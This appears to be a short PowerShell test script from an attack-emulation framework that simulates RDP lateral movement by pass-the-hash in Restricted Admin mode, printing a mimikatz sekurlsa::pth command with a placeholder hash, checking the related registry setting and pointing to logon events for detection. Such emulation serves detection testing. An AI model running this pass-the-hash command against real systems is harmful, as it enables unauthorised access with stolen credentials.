# CADRE — WT086 — RDP Lateral Movement (Restricted Admin)
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT086 - RDP Lateral Movement"
start_attack "086" "RDP Lateral Movement"
step "Requires NTLM hash + RestrictedAdmin=0"
run_cmd "Write-Host 'RDP via PtH: mimikatz sekurlsa::pth /user:Admin /domain:cadre.local /ntlm:<hash> /run:\"mstsc.exe /restrictedadmin /v:mbr01\"'"
step "Check RestrictedAdmin status"
run_cmd "Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name DisableRestrictedAdmin"
result 0 "WT086 — check 4624 LogonType 10, Endpoint.events.network-*"
